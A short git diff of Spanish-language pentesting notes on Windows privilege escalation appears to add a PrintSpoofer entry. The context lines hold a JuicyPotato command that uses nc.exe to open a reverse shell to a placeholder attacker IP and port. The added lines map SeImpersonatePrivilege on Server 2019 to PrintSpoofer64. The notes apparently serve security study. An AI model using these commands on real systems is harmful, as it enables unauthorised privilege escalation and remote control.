@@ -51,5 +51,9 @@ En caso de que tuviesemos un nc.exe descargado, lanzarnos una RevShell
 ```bash
 Juicy.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\nc.exe -e cmd (OUR IP PORT)
 ```
-
 Tambien esta el rottenpotato.exe que veremos mas adelante.
+
+# PrintSpoofer.exe
+SeImpersonatePrivilege + Microsoft Windows Server 2019 Standard = PrintSpoofer64.exe
+
+
